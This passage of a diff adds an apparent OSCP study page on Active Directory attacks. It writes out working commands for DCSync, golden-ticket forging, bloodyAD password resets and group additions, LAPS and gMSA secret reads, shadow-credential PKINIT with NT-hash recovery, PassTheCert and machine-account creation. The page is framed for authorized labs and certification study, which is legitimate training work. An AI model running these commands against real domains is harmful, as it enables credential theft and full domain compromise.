+</code></pre>
+<p>Mimikatz equivalent from an authorized Windows context:</p>
+<pre><code class="language-text">lsadump::dcsync /domain:DOMAIN /user:TARGET_USER
+</code></pre>
+<blockquote>
+<p><strong>Decisive output:</strong> selected directory secret material returned through replication. Treat it as domain compromise evidence. Stop, protect evidence, document the delegated right and move to remediation reasoning rather than broad collection.</p>
+</blockquote>
+<h2 id="conditional-high-impact-ticket-forging-concepts">Conditional: high-impact ticket-forging concepts</h2>
+<p>Golden tickets require the domain SID and KRBTGT key. They are persistence/impact concepts, not a default Block 11 action. A forged ticket still depends on correct cryptographic material, realm, time and authorization. For the active service-scoped case, use <a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/#8-silver-tickets-forge-one-service-ticket">Silver tickets</a>.</p>
+<p>Authorized isolated-lab examples:</p>
+<pre><code class="language-bash"># Golden: realm-wide TGT material
+impacket-ticketer -nthash KRBTGT_NT_HASH -domain-sid DOMAIN_SID \
+  -domain DOMAIN AUTHORIZED_TEST_USER
+
+export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"
+klist
+</code></pre>
+<p>Use only against the approved service/host, record ticket metadata and remove generated credentials afterward. Domain recovery after KRBTGT exposure generally requires coordinated credential rotation and replication convergence; service-ticket exposure requires rotating the affected service/machine secret and reviewing access.</p>
+<h2 id="bloodyad--linux-side-ldap-reads-and-permission-backed-writes">bloodyAD — Linux-side LDAP reads and permission-backed writes</h2>
+<p>Use an authenticated LDAP context and the exact right on the target object. Start with a read. These writes are distinct alternatives selected by the observed ACL:</p>
+<pre><code class="language-bash"># Inspect the target/group instead of assuming the relationship
+bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
+  get object TARGET_OBJECT --attr distinguishedName,member,memberOf
+
+# Force-change-password right on this specific account
+bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
+  set password TARGET_USER 'NEW_PASSWORD'
+
+# Write-members right on this specific group
+bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
+  add groupMember TARGET_GROUP USER
+</code></pre>
+<p>Read: verify the actual attribute change and test the resulting identity/capability through a compatible service. Group changes do not automatically refresh an existing process token/ticket. Access denied → inspect the object DACL and protected-account context; authentication alone is insufficient. Account Operators membership does not imply control over protected administrator accounts/groups.</p>
+<p>Sources: <a href="https://github.com/CravateRouge/bloodyAD/wiki/User-Guide">upstream 1</a>.</p>
+<h2 id="delegated-reads--laps-and-gmsa-material">Delegated reads — LAPS and gMSA material</h2>
+<p>Use when directory permissions grant access to the secret-bearing attribute. Being able to enumerate the computer or service account does not grant that read.</p>
+<pre><code class="language-bash"># Classic LAPS: password for the relevant computer's local administrator
+bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
+  get object 'COMPUTER$' --attr ms-Mcs-AdmPwd
+
+# Windows LAPS: returned content/format depends on schema and protection
+bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
+  get object 'COMPUTER$' --attr msLAPS-Password
+
+# gMSA: inspect the allowed managed-password attribute
+bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
+  get object 'GMSA$' --attr msDS-ManagedPassword
+</code></pre>
+<p>Read: a LAPS value is scoped to the named host's local account. An encrypted Windows-LAPS value still needs the permitted decryption context. A gMSA blob/base64 string is not automatically a directly reusable NT hash: parse/decode it with a compatible gMSA tool before choosing authentication. Missing/denied attributes → distinguish schema, permissions and an empty value.</p>
+<p>Sources: <a href="https://github.com/CravateRouge/bloodyAD/wiki/User-Guide">upstream 1</a> · <a href="https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview">upstream 2</a>.</p>
+<h2 id="shadow-credentials--object-key-write-pkinit-then-cleanup">Shadow credentials — object-key write, PKINIT, then cleanup</h2>
+<p>Use only with effective write access to the target's <code>msDS-KeyCredentialLink</code>, a DC supporting the required key-trust/PKINIT behavior, correct time/DNS and compatible certificates. Inspect existing values first.</p>
+<pre><code class="language-bash">python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \
+  --target TARGET_USER --action list
+
+# Adds a new key credential and generates certificate material; record its DeviceID
+python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \
+  --target TARGET_USER --action add --filename target-key
+
+# Use the generated PFX password; request the target principal's TGT
+python3 gettgtpkinit.py -cert-pfx target-key.pfx -pfx-pass 'PFX_PASSWORD' \
+  -dc-ip DC_IP DOMAIN/TARGET_USER target.ccache
+export KRB5CCNAME="$PWD/target.ccache"
+klist
+
+# Optional NT-hash recovery from this PKINIT TGT; key is the printed AS-REP key
+python3 getnthash.py -key AS_REP_KEY -dc-ip DC_IP DOMAIN/TARGET_USER
+
+# Remove only the key credential you added; never clear unrelated original values
+python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \
+  --target TARGET_USER --action remove --device-id DEVICE_ID
+</code></pre>
+<p>Read: a successful attribute write does not yet establish a TGT or service authorization. Verify the cached principal and the intended service. PKINIT/certificate failure → inspect KDC support, mapping and trust; do not keep overwriting keys. Preserve the original state and remove only your added DeviceID after the test.</p>
+<p>Sources: <a href="https://github.com/ShutdownRepo/pywhisker">upstream 1</a> · <a href="https://github.com/dirkjanm/PKINITtools">upstream 2</a>.</p>
+<h2 id="passthecert--schannelldap-when-the-certificate-is-usable-there">PassTheCert — Schannel/LDAP when the certificate is usable there</h2>
+<p>Use a certificate/private key mapped to an accepted AD identity with the necessary trust/EKU and a working LDAP TLS path. PKINIT and Schannel are different authentication paths: failure of one does not prove the other works or fails.</p>
+<pre><code class="language-bash"># Extract PEM material from the relevant PFX; respond to password prompts
+openssl pkcs12 -in USER.pfx -clcerts -nokeys -out USER.crt
+openssl pkcs12 -in USER.pfx -nocerts -nodes -out USER.key
+
+# First identify the principal accepted through the certificate
+python3 passthecert.py -action whoami -crt USER.crt -key USER.key \
+  -domain DOMAIN -dc-host DC_HOST -dc-ip DC_IP
+
+# Inspect operations in the LDAP shell before choosing an authorized write
+python3 passthecert.py -action ldap-shell -crt USER.crt -key USER.key \
+  -domain DOMAIN -dc-host DC_HOST -dc-ip DC_IP
+</code></pre>
+<p>Read: successful binding proves that mapped identity's LDAP context, not domain administration. The same object ACL still governs group/password/delegation writes. Certificate trust/mapping, TLS policy or a missing private key can block this route. Do not weaken workstation-wide TLS settings to compensate for an unexplained failure.</p>
+<p>Sources: <a href="https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/README.md">upstream 1</a>.</p>
+<h2 id="powermad--create-an-account-only-when-the-chosen-ad-path-needs-it">Powermad — create an account only when the chosen AD path needs it</h2>
+<p>Use from a suitable authenticated PowerShell context when the actual quota/delegation permits computer creation and the planned path needs an account/SPN you control. Account creation alone does not grant RBCD rights on another host.</p>
+<pre><code class="language-powershell">Import-Module .\Powermad.ps1
+$machinePassword = ConvertTo-SecureString 'MACHINE_PASSWORD' -AsPlainText -Force
+New-MachineAccount -MachineAccount NEWPC -Password $machinePassword `
+  -Domain DOMAIN -DomainController DC_HOST
+</code></pre>
+<p>Read: verify the created account, its SPNs and the chosen target-object permission separately. Quota, OU ACLs and existing names can stop the operation. Standard create rights do not necessarily permit deleting the created account later; establish the cleanup route and avoid repeated throwaway account creation.</p>
+<p>Sources: <a href="https://github.com/Kevin-Robertson/Powermad">upstream 1</a>.</p>
+<h2 id="gmsa--obtain-a-decoded-hash-only-with-managed-password-read-rights">gMSA — obtain a decoded hash only with managed-password read rights</h2>
+<p>Use when the accepted directory identity has the managed-password read permission for the gMSA. NetExec selects LDAPS for this operation, so the DC's LDAP TLS path must work.</p>
+<pre><code class="language-bash">nxc ldap DC_IP -d DOMAIN -u USER -p 'PASSWORD' --gmsa
+
+# After identifying the returned service account and hash, test one relevant service
+nxc smb TARGET -d DOMAIN -u 'GMSA$' -H HASH --shares
+</code></pre>
+<p>Read: keep the exact service-account name and decoded NT hash together; an encoded <code>msDS-ManagedPassword</code> blob is a different representation. Authentication acceptance still does not prove administrative/remote-execution rights. Empty output → inspect object permissions, LDAPS, account type and collection errors before concluding that no gMSA path exists.</p>
+<p>Sources: <a href="https://www.netexec.wiki/ldap-protocol/dump-gmsa">upstream 1</a>.</p>
+<h2 id="sources">Sources</h2>
+<ul>
+<li>Supplied PEN-200, Chapter 23, especially the targeted Kerberoast, silver-ticket and DCSync sections.</li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge">OffSec OSCP+ Body of Knowledge</a></li>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerSploit PowerView (archived)</a></li>
+<li><a href="https://lizajose.github.io/getSH/ad">getSH Active Directory: Object Permissions, AD CS, GPO Abuse and Domain Compromise</a>, source snapshot <a href="https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98"><code>e1f62dd</code></a></li>
+<li><a href="https://github.com/ly4k/Certipy">Certipy</a></li>
+<li><a href="https://github.com/fortra/impacket/blob/master/examples/secretsdump.py">Impacket secretsdump</a></li>
+<li><a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">SpecterOps AD CS research</a></li>
+<li><a href="https://github.com/LeonardoE95/OSCP/tree/main/modules/active-directory">Hexdump Active Directory modules</a></li>
+</ul></article><hr><p><a href="#document">Top of document</a> · <a href="/oscp/">Reference home</a></p></main></body></html>
